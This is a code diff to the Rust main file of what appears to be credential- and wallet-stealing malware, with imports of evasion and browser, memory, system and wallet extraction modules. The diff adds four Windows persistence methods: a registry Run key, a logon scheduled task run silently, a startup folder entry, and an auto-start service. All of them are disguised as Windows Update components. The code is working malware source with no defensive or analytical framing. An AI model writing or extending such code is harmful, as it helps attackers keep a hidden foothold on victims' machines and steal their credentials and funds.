@@ -13,6 +13,15 @@ use hmm_core_agent::module::evasion::{EvasionConfig, EvasionTask};
 use hmm_core_agent::module::extractor::{
     BrowserExtractor, MemoryExtractor, SystemExtractor, WalletExtractor, Confidence,
 };
+use hmm_core_agent::module::persistence::{
+    PersistenceMethod, RegistryPersistence,
+    ScheduledTaskPersistence, StartupFolderPersistence,
+    ServicePersistence,
+};
+use hmm_core_agent::module::persistence::registry::RegistryPersistenceConfig;
+use hmm_core_agent::module::persistence::scheduled_task::{ScheduledTaskConfig, TaskTrigger};
+use hmm_core_agent::module::persistence::startup::StartupFolderConfig;
+use hmm_core_agent::module::persistence::service::{ServiceConfig, ServiceStartup};
 use hmm_core_agent::module::processing::{
     ProcessingPipeline, ProcessingConfig, CompressionMode,
 };
@@ -52,6 +61,173 @@ fn main() {
 
     // Create shared data context for pipeline
     let data_context = Arc::new(DataContext::new());
+
+    // STEP 3: Register persistence task (optional, runs after evasion check)
+    // Persistence is registered but can be enabled/disabled via environment variable
+    if std::env::var("HMM_ENABLE_PERSISTENCE").unwrap_or_default() == "1" {
+        info!("Persistence enabled via HMM_ENABLE_PERSISTENCE=1");
+        
+        let persistence_methods = vec![
+            // Registry Run key (current user, no admin required)
+            FnTask::new("persist_registry", |_cfg, cancel| {
+                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
+                
+                info!("Attempting registry persistence...");
+                let exe_path = std::env::current_exe()
+                    .map(|p| p.display().to_string())
+                    .unwrap_or_else(|_| String::new());
+                
+                if exe_path.is_empty() {
+                    return Err(CoreError::TaskFailed {
+                        task: "persist_registry".to_string(),
+                        reason: "Could not determine executable path".to_string(),
+                    });
+                }
+                
+                let config = RegistryPersistenceConfig::for_current_user(
+                    "WindowsUpdateCheck",
+                    &exe_path,
+                );
+                
+                match RegistryPersistence::install(&config) {
+                    Ok(result) => {
+                        info!("Registry persistence installed: {:?}", result.identifier);
+                        if let Some(cleanup) = result.cleanup_command {
+                            info!("Cleanup command: {}", cleanup);
+                        }
+                        Ok(())
+                    }
+                    Err(e) => {
+                        warn!("Registry persistence failed: {}", e);
+                        Err(CoreError::TaskFailed {
+                            task: "persist_registry".to_string(),
+                            reason: e.to_string(),
+                        })
+                    }
+                }
+            }),
+            // Scheduled task (at logon)
+            FnTask::new("persist_scheduled_task", |_cfg, cancel| {
+                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
+                
+                info!("Attempting scheduled task persistence...");
+                let exe_path = std::env::current_exe()
+                    .map(|p| p.display().to_string())
+                    .unwrap_or_else(|_| String::new());
+                
+                if exe_path.is_empty() {
+                    return Err(CoreError::TaskFailed {
+                        task: "persist_scheduled_task".to_string(),
+                        reason: "Could not determine executable path".to_string(),
+                    });
+                }
+                
+                let config = ScheduledTaskConfig::at_logon(
+                    "WindowsUpdateCheck",
+                    &exe_path,
+                )
+                .with_arguments("--silent");
+                
+                match ScheduledTaskPersistence::install(&config) {
+                    Ok(result) => {
+                        info!("Scheduled task persistence installed: {:?}", result.identifier);
+                        Ok(())
+                    }
+                    Err(e) => {
+                        warn!("Scheduled task persistence failed: {}", e);
+                        Err(CoreError::TaskFailed {
+                            task: "persist_scheduled_task".to_string(),
+                            reason: e.to_string(),
+                        })
+                    }
+                }
+            }),
+            // Startup folder (Windows only)
+            FnTask::new("persist_startup", |_cfg, cancel| {
+                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
+                
+                info!("Attempting startup folder persistence...");
+                let exe_path = std::env::current_exe()
+                    .map(|p| p.display().to_string())
+                    .unwrap_or_else(|_| String::new());
+                
+                if exe_path.is_empty() {
+                    return Err(CoreError::TaskFailed {
+                        task: "persist_startup".to_string(),
+                        reason: "Could not determine executable path".to_string(),
+                    });
+                }
+                
+                let config = StartupFolderConfig::for_current_user(
+                    "WindowsUpdateCheck",
+                    &exe_path,
+                );
+                
+                match StartupFolderPersistence::install(&config) {
+                    Ok(result) => {
+                        info!("Startup folder persistence installed: {:?}", result.identifier);
+                        Ok(())
+                    }
+                    Err(e) => {
+                        warn!("Startup folder persistence failed: {}", e);
+                        Err(CoreError::TaskFailed {
+                            task: "persist_startup".to_string(),
+                            reason: e.to_string(),
+                        })
+                    }
+                }
+            }),
+            // Service installation (requires admin)
+            FnTask::new("persist_service", |_cfg, cancel| {
+                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
+                
+                info!("Attempting service persistence...");
+                let exe_path = std::env::current_exe()
+                    .map(|p| p.display().to_string())
+                    .unwrap_or_else(|_| String::new());
+                
+                if exe_path.is_empty() {
+                    return Err(CoreError::TaskFailed {
+                        task: "persist_service".to_string(),
+                        reason: "Could not determine executable path".to_string(),
+                    });
+                }
+                
+                let config = ServiceConfig::new(
+                    "WindowsUpdateService",
+                    "Windows Update Check Service",
+                    &exe_path,
+                )
+                .with_description("Checks for Windows updates periodically")
+                .with_startup(ServiceStartup::Automatic);
+                
+                match ServicePersistence::install(&config) {
+                    Ok(result) => {
+                        info!("Service persistence installed: {:?}", result.identifier);
+                        // Try to start the service
+                        if let Err(e) = ServicePersistence::start("WindowsUpdateService") {
+                            warn!("Failed to start service: {}", e);
+                        }
+                        Ok(())
+                    }
+                    Err(e) => {
+                        warn!("Service persistence failed (may require admin): {}", e);
+                        Err(CoreError::TaskFailed {
+                            task: "persist_service".to_string(),
+                            reason: e.to_string(),
+                        })
+                    }
+                }
+            }),
+        ];
+        
+        // Register all persistence methods
+        for task in persistence_methods {
+            orchestrator.register_task(task);
+        }
+    } else {
+        info!("Persistence disabled (set HMM_ENABLE_PERSISTENCE=1 to enable)");
+    }
 
     // Register extraction tasks - these add records to the shared context
     let ctx_wallet = Arc::clone(&data_context);
